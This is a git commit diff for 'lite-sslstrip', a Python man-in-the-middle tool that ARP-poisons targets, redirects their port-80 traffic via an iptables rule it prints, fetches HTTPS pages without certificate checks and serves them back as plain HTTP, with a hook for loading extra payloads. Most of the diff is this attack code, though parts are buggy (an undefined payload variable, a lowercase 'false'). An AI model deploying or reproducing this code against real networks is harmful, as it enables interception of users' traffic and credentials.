3b9e4bdaf74a787bfa798c5e416c6e8f9806fb8b
Yoram Meijaard <meijaardyoram@gmail.com>
2018-04-03 17:40:36 +0200

    Redirection fully functional
    Current implementation should work!

--- lite-sslstrip/main.py
+++ lite-sslstrip/main.py
@@ -2,13 +2,37 @@
 ## Reads user input and
 ## launches the ARP-poisoning and SSL strip
 
-# TODO horrible intro ASCII art
+
 import argparse
 from arppoison import ArpPoison
 import cherrypy
 import random
 import string
 import requests
+
+print ""
+print ""
+print " __          __                                            __              __                __           "
+print "/  |        /  |                                          /  |            /  |              /  |          "
+print "$$ |       _$$ |_     ______            _______   _______ $$ |  _______  _$$ |_     ______  $$/   ______  "
+print "$$ |      / $$   |   /      \  ______  /       | /       |$$ | /       |/ $$   |   /      \ /  | /      \ "
+print "$$ |      $$$$$$/   /$$$$$$  |/      |/$$$$$$$/ /$$$$$$$/ $$ |/$$$$$$$/ $$$$$$/   /$$$$$$  |$$ |/$$$$$$  |"
+print "$$ |        $$ | __ $$    $$ |$$$$$$/ $$      \ $$      \ $$ |$$      \   $$ | __ $$ |  $$/ $$ |$$ |  $$ |"
+print "$$ |_____   $$ |/  |$$$$$$$$/          $$$$$$  | $$$$$$  |$$ | $$$$$$  |  $$ |/  |$$ |      $$ |$$ |__$$ |"
+print "$$       |  $$  $$/ $$       |        /     $$/ /     $$/ $$ |/     $$/   $$  $$/ $$ |      $$ |$$    $$/ "
+print "$$$$$$$$/    $$$$/   $$$$$$$/         $$$$$$$/  $$$$$$$/  $$/ $$$$$$$/     $$$$/  $$/       $$/ $$$$$$$/  "
+print "                                                                                                $$ |      "
+print "                                                                                                $$ |      "
+print "                                                                                                $$/   "
+print ""
+print ""
+
+## Helper block, to remind the user of actions that need performing
+print "Welcome to lite-sslstrip"
+print "Check if \"/proc/sys/net/ipv4/ip_forward\" is set to 1"
+print "IP tables need to reroute incoming traffic to lite-sslstrip, please run:"
+# reroutes incoming trafic on port 80 (http) to port 8080 (lite-ssl)
+print " iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080"
 
 # Commandline arguments for ARP-spoofing
 parser = argparse.ArgumentParser()
@@ -31,6 +55,12 @@ arp.arpPoisonA()
 if (args.spoof_bob):
     arp.arpPoisonB()
 
+def log(msg):
+    print msg
+
+def http(url):
+    return "http://" + url
+
 # Initiate a request to Bob via a secure https request without verification of certificate
 def startSSLConnection(url):
     response = requests.get(url, verify=False)
@@ -39,8 +69,7 @@ def startSSLConnection(url):
 def makeBelievableResponse(r):
     ## Apply modifications to the URL
     # first of all update the location that is going to be displayed
-    updatedURL = url[:5].join(url[6:])  # cut out the s in https
-    r.headers['location'] = updatedURL
+    r.url = http(args.ipB)# cut out the s in https
 
     # secondly change the statuscode to a proper request
     r.status_code = 200
@@ -48,37 +77,50 @@ def makeBelievableResponse(r):
     return r
 
 class SSLStrip(object):
+    # actual method that does the ssl stripping
     @cherrypy.expose
     def index(self):
         # get content from server
-        r = requests.get(args.macB)
-        url = r.headers['location']
+        r = requests.get(http(args.ipB))
+        url = r.url
 
         # apply checks to figure out whether this is a 302 redirect for an http request
-        if (r.status_code == 302 & url[:5] == "https"):
-                print "HTTPS redirect SSL stripping engaged"
+        if (r.is_redirect and url[:5] == "https"):
+            print "HTTPS redirect SSL stripping engaged"
 
-                # Request https enabled content from Bob
-                secureResponse = startSSLConnection(url)
+            # Request https enabled content from Bob
+            secureResponse = startSSLConnection(url)
 
-                # reset the request content to the actual content of the webpage
-                r.content = secureResponse.content
+            # reset the request content to the actual content of the webpage and
+            # change headers in response, reset status codes,
+            response = makeBelievableResponse(secureResponse)
 
-                # change headers in response, reset status codes,
-                response = makeBelievableResponse(r)
+            # Additional payloads can be loaded from an external script, runs the payload() function
+            if (payload != false):
+                print "Own payload loaded from" + payload
+                import payload
+                response = payload.payload(response)
 
-                # Additional payloads can be loaded from an external script, runs the payload() function
-                if (payload != false):
-                    print "Own payload loaded from" + payload
-                    import payload
-                    response = payload.payload(response)
-
-                # return the response
-                return response.content
+            # return the response
+            return response.content
         else:
             # if it is not a redirect, then return whatever you have been given
-            return r.content
+            return r.text
 
+    @cherrypy.expose
+    def hello(self):
+        log("Hello World request received")
+        return "Hello World"
+
+    @cherrypy.expose
+    def redirect(self):
+        log("Test request received")
+        ## start by requesting a simple http form from bob
+        r = requests.get(http(args.ipB))
+        print r.status_code
+        print r.headers
+
+        return r.text
 # starting the server
 if __name__ == '__main__':
     # this command binds cherrypy to all interfaces of this machine, hence it is findable on the network
